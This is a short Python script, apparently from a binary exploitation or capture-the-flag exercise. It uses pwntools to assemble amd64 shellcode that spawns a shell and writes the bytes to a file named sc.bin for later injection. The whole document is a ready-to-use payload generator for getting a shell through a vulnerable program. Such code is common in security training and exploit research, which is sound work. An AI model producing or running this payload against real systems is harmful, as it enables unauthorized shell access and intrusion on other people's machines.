from pwn import *

fd = open('sc.bin', 'w')
p = asm(shellcraft.amd64.sh(), arch = 'amd64')
fd.write(p)
fd.close()
